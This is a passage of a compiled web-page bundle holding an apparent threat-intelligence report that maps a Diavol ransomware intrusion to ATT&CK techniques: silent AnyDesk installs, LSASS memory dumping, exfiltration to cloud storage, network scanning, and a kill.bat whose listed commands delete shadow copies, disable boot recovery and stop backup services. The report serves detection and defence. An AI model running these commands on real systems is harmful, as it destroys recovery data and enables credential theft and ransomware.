",(0,l.kt)("em",{parentName:"h3"},"PowerShell")," and ",(0,l.kt)("em",{parentName:"h3"},"CMD")," to install ",(0,l.kt)("em",{parentName:"h3"},"AnyDesk")," for Persistence."),(0,l.kt)("h4",{id:"tactic-14"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Persistence")),(0,l.kt)("h4",{id:"techniques-14"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1071.001 - Application Layer Protocol: Web Protocols"),(0,l.kt)("li",{parentName:"ul"},"T1059.001 - Command and Scripting Interpreter: PowerShell"),(0,l.kt)("li",{parentName:"ul"},"T1219 - Remote Access Software"),(0,l.kt)("li",{parentName:"ul"},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell")),(0,l.kt)("h4",{id:"behaviors-and-observables-14"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1071.001",(0,l.kt)("br",null),"T1059.001"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"PowerShell")," performed network connections."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"n/d"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"download.anydesk.com"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1219"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"PowerShell")," downloads ",(0,l.kt)("em",{parentName:"td"},"AnyDesk.exe"),"."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\ProgramData\\\\AnyDesk.exe"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"PowerShell")," spawned ",(0,l.kt)("em",{parentName:"td"},"CMD")," commands to install ",(0,l.kt)("em",{parentName:"td"},"AnyDesk.exe"),"."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd.exe /c C:\\ProgramData\\AnyDesk.exe --install C:\\ProgramData\\AnyDesk --start-with-win --silent"),(0,l.kt)("br",null),"- `cmd.exe /c echo J9kzQ2Y0qO")))),(0,l.kt)("h4",{id:"notes-8"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"The password 'J9kzQ2Y0qO' matches one from the leaked Conti manuals back in August.")),(0,l.kt)("h3",{id:"threat-actor-used-rdp-to-install-filezilla-for-exfiltration"},"Threat Actor used ",(0,l.kt)("em",{parentName:"h3"},"RDP")," to install ",(0,l.kt)("em",{parentName:"h3"},"FileZilla")," for Exfiltration."),(0,l.kt)("h4",{id:"tactic-15"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Exfiltration")),(0,l.kt)("h4",{id:"techniques-15"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1048 - Exfiltration Over Alternative Protocol"),(0,l.kt)("li",{parentName:"ul"},"T1021.001 - Remote Services: Remote Desktop Protocol")),(0,l.kt)("h4",{id:"behaviors-and-observables-15"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1048",(0,l.kt)("br",null),"T1021.001"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor installed FileZilla."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"FileZillaPortable.exe."))))),(0,l.kt)("h3",{id:"threat-actor-used-task-manager-to-dump-lsass-process-memory-for-credential-access"},"Threat Actor used ",(0,l.kt)("em",{parentName:"h3"},"Task Manager")," to dump LSASS process memory for Credential Access."),(0,l.kt)("h4",{id:"tactic-16"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Credential Access")),(0,l.kt)("h4",{id:"techniques-16"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1021.001 - Remote Services: Remote Desktop Protocol"),(0,l.kt)("li",{parentName:"ul"},"T1003.001 - OS Credential Dumping: LSASS Memory")),(0,l.kt)("h4",{id:"behaviors-and-observables-16"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1021.001"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Explorer")," opened ",(0,l.kt)("em",{parentName:"td"},"Task Manager"),"."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\Windows\\system32\\taskmgr.exe" /7'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null}),(0,l.kt)("td",{parentName:"tr",align:null},"Task Manager accessed LSASS process memory."),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1003.001"),(0,l.kt)("td",{parentName:"tr",align:null},"Dumped LSASS process memory via Task Manager."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\lsass.DMP"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\lsass (2).DMP"))))),(0,l.kt)("h3",{id:"threat-actor-used-web-browser-to-upload-lsass-dump-file-to-cloud-storage-for-exfiltration"},"Threat Actor used ",(0,l.kt)("em",{parentName:"h3"},"Web browser")," to upload LSASS dump file to Cloud Storage for Exfiltration."),(0,l.kt)("h4",{id:"tactic-17"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Exfiltration")),(0,l.kt)("h4",{id:"techniques-17"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1567.002 - Exfiltration Over Web Service: Exfiltration to Cloud Storage")),(0,l.kt)("h4",{id:"behaviors-and-observables-17"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1567.002"),(0,l.kt)("td",{parentName:"tr",align:null},"Uploaded file to Cloud Storage via Web Browser."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"DNS Queried"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"ufile.io"))))),(0,l.kt)("h3",{id:"threat-actor-used-rdp-to-download-and-execute-portable-version-of-advanced_ip_scanner-for-discovery"},"Threat Actor used ",(0,l.kt)("em",{parentName:"h3"},"RDP")," to download and execute portable version of ",(0,l.kt)("em",{parentName:"h3"},"Advanced_IP_Scanner")," for Discovery."),(0,l.kt)("h4",{id:"tactic-18"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Discovery")),(0,l.kt)("h4",{id:"techniques-18"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1021.001 - Remote Services: Remote Desktop Protocol"),(0,l.kt)("li",{parentName:"ul"},"T1105 - Ingress Tool Transfer"),(0,l.kt)("li",{parentName:"ul"},"T1046 - Network Service Scanning")),(0,l.kt)("h4",{id:"behaviors-and-observables-18"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1021.001",(0,l.kt)("br",null),"T1105"),(0,l.kt)("td",{parentName:"tr",align:null},"iexplore.exe performed network connection to public IPs"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"51.89.153.153"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"download.advanced-ip-scanner[.]com"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1105"),(0,l.kt)("td",{parentName:"tr",align:null},"iexplore.exe dropped file Advanced_IP_Scanner"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"*\\\\Downloads\\\\Advanced_IP_Scanner_2.5.3850.exe"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1046",(0,l.kt)("br",null),"T1021.001"),(0,l.kt)("td",{parentName:"tr",align:null},"Executed Advanced_IP_Scanner manually over RDP"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"n/d"))))),(0,l.kt)("h3",{id:"threat-actor-used-mssqludpscannerexe-mssql-tool-for-discovery"},"Threat Actor used ",(0,l.kt)("em",{parentName:"h3"},"MSSQLUDPScanner.exe")," MSSQL tool for Discovery."),(0,l.kt)("h4",{id:"tactic-19"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Discovery")),(0,l.kt)("h4",{id:"techniques-19"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1046 - Network Service Scanning")),(0,l.kt)("h4",{id:"behaviors-and-observables-19"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1046"),(0,l.kt)("td",{parentName:"tr",align:null},"Executed MSSQLUDPScanner.exe"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"MSSQLUDPScanner.exe --cdir #{range}"))))),(0,l.kt)("h4",{id:"notes-9"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"MSSQLUDPScanner.exe is an offensive tool"),(0,l.kt)("li",{parentName:"ul"},"Likely https://github","[.]","com/rvrsh3ll/MSSQLUDPScanner"),(0,l.kt)("li",{parentName:"ul"},"Likely executed via Cobalt Strike")),(0,l.kt)("h3",{id:"threat-actor-used-well-known-batch-file--killbat--to-inhibit-system-recovery-for-impact"},"Threat Actor used well known batch file -",(0,l.kt)("em",{parentName:"h3"},"kill.bat"),"- to inhibit system recovery for Impact."),(0,l.kt)("h4",{id:"tactic-20"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Impact")),(0,l.kt)("h4",{id:"techniques-20"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1562.001 - Impair Defenses: Disable or Modify Tools"),(0,l.kt)("li",{parentName:"ul"},"T1490 - Inhibit System Recovery")),(0,l.kt)("h4",{id:"behaviors-and-observables-20"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1562.001",(0,l.kt)("br",null),"T1490"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"CMD")," executed batch script named ",(0,l.kt)("em",{parentName:"td"},"kill.bat"),"."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'sc  config \\"Netbackup Legacy Network service\\" start= disabled'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"bcdedit  /set {default}"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"bcdedit  /set {default} recoveryenabled No"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"vssadmin.exe  Delete Shadows /all /quiet"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"wmic.exe  Shadowcopy Delete"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'net  stop \\"Zoolz 2 Service\\" /y'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'net  stop \\"Veeam Backup Catalog Data Service\\" /y'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'net  stop \\"Symantec System Recovery\\" /y'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'net  stop \\"SQLsafe Filter Service\\" /y'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'net  stop \\"SQLsafe Backup Service\\" /y'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'net  stop \\"SQL Backups\\" /y'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'net  stop \\"Acronis VSS Provider\\" /y'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"net  stop VeeamDeploySvc /y"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"net  stop BackupExecVSSProvider /y"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"net  stop BackupExecRPCService /y"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"net  stop BackupExecManagementService /y"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"net  stop BackupExecJobEngine /y"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"net  stop BackupExecDeviceMediaService /y"))))),(0,l.kt)("h3",{id:"threat-actor-used-rdp-to-execute-diavol-ransomware-binary-manually-on-targets-for-impact"},"Threat Actor used ",(0,l.kt)("em",{parentName:"h3"},"RDP")," to execute Diavol Ransomware binary manually on targets for Impact."),(0,l.kt)("h4",{id:"tactic-21"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Impact")),(0,l.kt)("h4",{id:"techniques-21"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1486 - Data Encrypted for Impact"),(0,l.kt)("li",{parentName:"ul"},"T1491.001 - Defacement: Internal Defacement"),(0,l.kt)("li",{parentName:"ul"},"T1021.001 - Remote Services: Remote Desktop Protocol")),(0,l.kt)("h4",{id:"behaviors-and-observables-21"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1486",(0,l.kt)("br",null),"T1491.001",(0,l.kt)("br",null),"T1021.001"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Explorer.exe")," launched ransomware."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\ProgramData\\\\CryptoLocker64.exe."))))))}p.isMDXComponent=!0}}]);